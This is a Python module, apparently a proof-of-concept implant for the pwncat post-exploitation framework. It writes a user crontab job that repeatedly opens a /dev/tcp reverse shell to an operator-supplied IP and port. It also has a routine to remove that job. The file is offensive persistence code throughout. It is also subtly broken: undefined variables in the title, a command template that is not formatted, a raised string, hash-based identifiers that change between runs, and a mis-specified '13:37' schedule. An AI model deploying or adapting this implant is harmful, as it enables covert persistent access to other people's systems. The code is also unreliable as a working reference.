#!/usr/bin/env python3
from crontab import CronTab #https://pypi.org/project/python-crontab/
import getpass # https://stackoverflow.com/questions/842059/is-there-a-portable-way-to-get-the-current-username-in-python#842096

import pwncat
from pwncat.platform.linux import Linux
from pwncat.modules import Status, Argument, ModuleFailed
from pwncat.modules.implant import ImplantModule

class CronImplant(ImplantModule):
    
    def __init__(self, source, ip, port, schedule):
        super().__init__(source=source)

        self.ip = ip
        self.port = port
        self.schedule = schedule

    def title(self, session: "pwncat.manager.Session"):
        return f"reverse shell connects to [blue]{ip}[/blue]:[cyan]{port}[/cyan] every [red]{schedule}[/red]"

    def description(self, session: "pwncat.manager.Session"):
        """Use current SHELL environment varable and /dev/tcp/ to execute a reverse shell on a cron schedule. Cron takes predetermined options: @reboot, every_minute, hourly, daily, @1337 (daily at 1337)"""
        return None

    def escalate(self, session: "pwncat.manager.Session"):
        # not sure how to incorporate escalte with this implant
        return None

class Module(ImplantModule):
    """Add reverse shell in crontab for current user."""

    PLATFORM = [Linux]
    ARGUMENTS = {
        **ImplantModule.ARGUMENTS,
        "ip": Argument(str, help="the IP/domain to call back to"),
        "port": Argument(str, default="4444", help="the port to connect to (default: 4444"),
        "schedule": Argument(str, default="every_minute", help="the cron schedule used (default: every_minute)")
        }

    def install(self, session: "pwncat.manager.Session", ip, port, schedule):
        
        #testing input
        if schedule not in ["@reboot", "every_minute", "hourly", "daily", "@1337"]:
            raise "Pick from @reboot, every_minute, hourly, daily, or @1337"
        
        #testing write privileges
        cron = CronTab(user=getpass.getuser())
        job = cron.new(command='echo hello_world', comment=hash(getpass.getuser()))
        job.minute.every(1)
        
        try:
            cron.write()
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc

        cron.remove_all(comment=hash(getpass.getuser()))
        job = cron.new(command=str(cron.env['SHELL']) + " -i >& /dev/tcp/{ip}/{port} 0>&1", comment=str(hash(getpass.getuser())))

        # starting out, for proof of concept, use predetermined schedules to pick from
        # cron schedule special cases
        # reboot
        if schedule == "@reboot":
            job.every_reboot()
        # every minute
        elif schedule == "every_minute":
            job.minute.every(1)
        # hourly
        elif schedule == "hourly":
            job.every().hours()
        # daily
        elif schedule == "daily":
            job.every().dows()
        # 1337
        elif schedule == "@1337":
            job.hour.every(13)
            job.minute.every(37)

        cron.write()

    def remove(self, session: "pwncat.manager.Session"):
        #Use user hash to remove them
        cron = CronTab(user=getpass.getuser())
        yield Status("removing reverse shell")
        try:
            cron.remove_all(comment=str(hash(getpass.getuser())))
        except (FileNotFoundError, PermissionError) as exc:
            raise ModuleFailed(str(exc)) from exc
